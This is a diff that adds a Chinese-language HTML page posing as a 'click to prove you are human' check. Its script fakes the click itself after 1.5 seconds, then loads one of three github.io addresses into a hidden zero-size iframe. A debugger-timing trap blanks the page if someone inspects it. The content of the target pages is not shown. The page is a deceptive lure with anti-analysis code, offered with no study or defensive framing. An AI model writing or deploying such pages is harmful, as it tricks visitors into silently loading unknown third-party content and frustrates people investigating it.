@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>验证跳转中...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #f2f2f2; }
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    #status { margin-top: 20px; font-size: 14px; color: #666; }
+    iframe { display: none; width: 0; height: 0; }
+  </style>
+</head>
+<body>
+  <h2>请点击按钮完成验证</h2>
+  <button id="verify">我是人类</button>
+  <div id="status">正在加载安全模块...</div>
+  <iframe id="jumpFrame"></iframe>
+
+  <script>
+    (function() {
+      const btn = document.getElementById("verify");
+      const status = document.getElementById("status");
+      const iframe = document.getElementById("jumpFrame");
+
+      const targets = [
+        "https://a78521336.github.io/4/",
+        "https://a78521336.github.io/2/",
+        "https://a78521336.github.io/3/"
+      ];
+
+      // 防调试函数
+      function antiDebug() {
+        const t = 160;
+        const start = new Date();
+        debugger;
+        const end = new Date();
+        if (end - start > t) {
+          document.body.innerHTML = "<h2>检测到非法调试，终止跳转。</h2>";
+          throw new Error("Debugger detected");
+        }
+      }
+
+      // 混淆函数名
+      function autoJump() {
+        status.innerText = "验证通过，正在跳转...";
+        btn.disabled = true;
+        btn.innerText = "验证中...";
+
+        const delay = Math.floor(Math.random() * 2000) + 1000;
+        setTimeout(() => {
+          try {
+            antiDebug();
+            const url = targets[Math.floor(Math.random() * targets.length)];
+            iframe.src = url;
+          } catch (e) {
+            console.warn("跳转失败:", e);
+          }
+        }, delay);
+      }
+
+      // 按钮点击
+      btn.addEventListener("click", autoJump);
+
+      // 模拟自动点击行为（伪装用户操作）
+      setTimeout(() => {
+        const evt = new MouseEvent("click", { bubbles: true });
+        btn.dispatchEvent(evt);
+      }, 1500); // 自动触发，1.5 秒后
+    })();
+  </script>
+</body>
+</html>
